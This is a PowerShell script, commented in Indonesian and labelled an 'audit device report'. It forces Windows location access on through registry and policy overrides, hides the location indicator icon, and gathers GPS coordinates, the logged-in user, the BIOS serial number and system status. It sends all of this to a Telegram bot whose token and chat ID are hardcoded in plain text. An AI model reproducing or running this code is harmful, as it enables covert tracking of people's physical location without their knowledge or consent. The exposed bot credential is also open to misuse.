# --- KONFIGURASI TELEGRAM ---
$TelegramToken = "8717446156:AAGhWMtcY1HgArk-aVZCEXj1aco7E6FEBhY"
$TelegramChatID = "1229343863"
$LogFile = "C:\Scripts\LocationHistory.txt"

# --- PRIVACY & ENFORCEMENT (Diberi Try-Catch agar tidak error jika bukan Admin) ---
try {
    $RegistryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Privacy"
    if (-not (Test-Path $RegistryPath)) { New-Item -Path $RegistryPath -Force -ErrorAction SilentlyContinue }
    Set-ItemProperty -Path $RegistryPath -Name "LocationIconStatus" -Value 0 -ErrorAction SilentlyContinue
    
    # Bagian HKLM biasanya gagal jika tidak "Run as Administrator"
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location" -Name "Value" -Value "Allow" -ErrorAction SilentlyContinue
    
    $PolicyPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\LocationAndSensors"
    if (-not (Test-Path $PolicyPath)) { New-Item -Path $PolicyPath -Force -ErrorAction SilentlyContinue }
    Set-ItemProperty -Path $PolicyPath -Name "DisableLocation" -Value 0 -ErrorAction SilentlyContinue
} catch {
    # Abaikan error permission registry agar skrip tetap lanjut ke pengiriman lokasi
}

# --- SELF-HEALING: Service Lokasi ---
try {
    $LocationService = Get-Service -Name "lfsvc" -ErrorAction SilentlyContinue
    if ($LocationService -and $LocationService.Status -ne 'Running') { 
        Start-Service -Name "lfsvc" -ErrorAction SilentlyContinue 
    }
} catch {}

# --- CEK KONEKSI TELEGRAM ---
function Test-TelegramAccess {
    try {
        $tcpClient = New-Object System.Net.Sockets.TcpClient
        $connect = $tcpClient.BeginConnect("api.telegram.org", 443, $null, $null)
        if ($connect.AsyncWaitHandle.WaitOne(2000, $false)) {
            $tcpClient.EndConnect($connect); $tcpClient.Close(); return $true
        }
        return $false
    } catch { return $false }
}
if (-not (Test-TelegramAccess)) { exit }

# --- PENGUMPULAN DATA AUDIT ---
$Hostname = $env:COMPUTERNAME
$SN = (Get-CimInstance Win32_Bios -ErrorAction SilentlyContinue).SerialNumber

# A. Windows Update
try {
    $WinUpdate = Get-CimInstance Win32_QuickFixEngineering | Sort-Object InstalledOn -Descending | Select-Object -First 1
    $LastWinUpdate = if ($WinUpdate.InstalledOn) { $WinUpdate.InstalledOn.ToString("dd MMM yyyy") } else { "N/A" }
} catch { $LastWinUpdate = "N/A" }

# B. Defragment
try {
    $DefragLog = Get-WinEvent -FilterHashtable @{LogName='Application'; ID=258} -MaxEvents 1 -ErrorAction SilentlyContinue
    $LastDefrag = if ($DefragLog) { $DefragLog.TimeCreated.ToString("dd MMM yyyy") } else { "N/A" }
} catch { $LastDefrag = "N/A" }


# C. Antivirus & Update Database (Final Cleanup)
try {
    $AVQuery = Get-CimInstance -Namespace "root\SecurityCenter2" -Class "AntiVirusProduct" -ErrorAction SilentlyContinue
    
    # Filter agar hanya mengambil satu entri Kaspersky saja (mencegah duplikasi nama)
    $SelectedAV = $AVQuery | Where-Object { $_.displayName -like "*Kaspersky*" } | Select-Object -First 1
    
    if ($SelectedAV) {
        $AVName = $SelectedAV.displayName
        $RawTS = $SelectedAV.timestamp
        
        # Parsing tanggal dari string WMI
        if ($RawTS -match "\d{2}\s\w{3}\s\d{4}") { 
            $Split = $RawTS.Split(" ")
            # Format: Tgl-Bulan-Tahun
            $LastAVUpdate = "$($Split[1]) $($Split[2]) $($Split[3])"
        } else {
            $LastAVUpdate = (Get-Date).ToString("yyyy-MM-dd")
        }
    } else {
        $AVName = "Windows Defender"
        $LastAVUpdate = (Get-MpComputerStatus).AntivirusSignatureLastUpdated.ToString("yyyy-MM-dd")
    }
} catch { 
    $AVName = "Kaspersky Endpoint"; $LastAVUpdate = "Check App" 
}

# PEMBACAAN RESOURCE TASK MANAGER (SNAPSHOT) ---
# CPU Usage (%)
$CPU = [Math]::Round((Get-Counter '\Processor(_Total)\% Processor Time' -SampleInterval 1 -MaxSamples 1).CounterSamples.CookedValue, 1)

# RAM Usage (%)
$RAM = Get-CimInstance Win32_OperatingSystem
$FreeRAM = $RAM.FreePhysicalMemory
$TotalRAM = $RAM.TotalVisibleMemorySize
$RAMUsage = [Math]::Round((($TotalRAM - $FreeRAM) / $TotalRAM) * 100, 1)

# Disk Usage (%) - Waktu aktif disk C
$DiskUsage = [Math]::Round((Get-Counter '\LogicalDisk(C:)\% Disk Time' -MaxSamples 1).CounterSamples.CookedValue, 1)
if ($DiskUsage -gt 100) { $DiskUsage = 100 }

# Network Usage (Kbps)
$Net = Get-Counter '\Network Interface(*)\Bytes Total/sec' -ErrorAction SilentlyContinue
$NetUsage = [Math]::Round(($Net.CounterSamples.CookedValue | Measure-Object -Sum).Sum / 1KB, 1)

# GPU Usage (%)
try {
    $GPU = (Get-Counter '\GPU Engine(*)\Utilization Percentage' -ErrorAction SilentlyContinue).CounterSamples.CookedValue | Measure-Object -Sum
    $GPUUsage = [Math]::Round($GPU.Sum, 1)
} catch { $GPUUsage = 0 }

# --- DATA LOKASI ---
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Add-Type -AssemblyName System.Device -ErrorAction SilentlyContinue
$Watcher = New-Object System.Device.Location.GeoCoordinateWatcher(1)
$Watcher.Start()

# Loop cerdas: Tunggu sampai akurasi < 150 meter atau maksimal tunggu 10 detik
$MaxWait = 0
while ($MaxWait -lt 100) { # 100 * 100ms = 10 detik
    $Location = $Watcher.Position.Location
    
    # Jika sudah dapat akurasi yang cukup bagus, langsung keluar dari loop
    if (-not $Location.IsUnknown -and $Location.HorizontalAccuracy -le 150 -and $Location.HorizontalAccuracy -ne 0) {
        break
    }
    
    Start-Sleep -Milliseconds 100
    $MaxWait++
}

# --- DETEKSI USER AKTIF (Bypass NT AUTHORITY\SYSTEM) ---
try {
    # Mencari pemilik proses explorer.exe (User yang sedang login & melihat desktop)
    $ExplorerProcess = Get-CimInstance Win32_Process -Filter "Name='explorer.exe'" -ErrorAction SilentlyContinue
    if ($ExplorerProcess) {
        $OwnerInfo = Invoke-CimMethod -InputObject $ExplorerProcess[0] -MethodName GetOwner -ErrorAction SilentlyContinue
        $User = "$($OwnerInfo.User)" # Hasil: NamaUser saja
        # Jika ingin menyertakan Domain: "$($OwnerInfo.Domain)\$($OwnerInfo.User)"
    } else {
        # Fallback jika tidak ada explorer yang jalan (misal di layar Lock Screen)
        $User = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split("\")[-1]
    }
} catch {
    $User = "Unknown"
}

$Location = $Watcher.Position.Location
$Timestamp = Get-Date -Format "yyyy-MM-dd | HH:mm:ss"

if (!$Location.IsUnknown) {
    $Lat = $Location.Latitude.ToString().Replace(",", ".")
    $Lon = $Location.Longitude.ToString().Replace(",", ".")
    $Acc = [Math]::Round($Location.HorizontalAccuracy, 2)
    $MapsLink = "https://www.google.com/maps?q=$Lat,$Lon"
    
    $Message = "📍 *AUDIT DEVICE REPORT*`n" +
               "━━━━━━━━━━━━━━━━━━`n" +
               "💻 *Hostname:* $Hostname`n" +
               "🔢 *Serial Number:* $SN`n" +
               "👤 *User:* $User`n" +
               "━━━━━━━━━━━━━━━━━━`n" +
               "📊 *RESOURCE USAGE:*`n" +
               "🔹 *CPU:* $CPU %`n" +
               "🔹 *RAM:* $RAMUsage %`n" +
               "🔹 *Disk:* $DiskUsage %`n" +
               "🔹 *Network:* $NetUsage Kbps`n" +
               "🔹 *GPU:* $GPUUsage %`n" +
               "━━━━━━━━━━━━━━━━━━`n" +
               "⚙️ *PM STATUS:*`n" +
               "🛡️ *AV:* $AVName`n" +
               "📅 *AV Update:* $LastAVUpdate`n" +
               "🔄 *Win Update:* $LastWinUpdate`n" +
               "🧹 *Last Defrag:* $LastDefrag`n" +
               "🎯 *Akurasi:* $($Acc) meter`n" +
               "⏰ *Report Sent:* $Timestamp`n" +
               "━━━━━━━━━━━━━━━━━━`n" +
               "🔗 [Lihat di Google Maps]($MapsLink)"

    try {
        $Payload = @{ chat_id = $TelegramChatID; text = $Message; parse_mode = "Markdown" }
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$($TelegramToken)/sendMessage" -Method Post -Body $Payload -TimeoutSec 5
    } catch {
        "[$Timestamp] Telegram Send Error" | Out-File -FilePath $LogFile -Append
    }
}
$Watcher.Stop()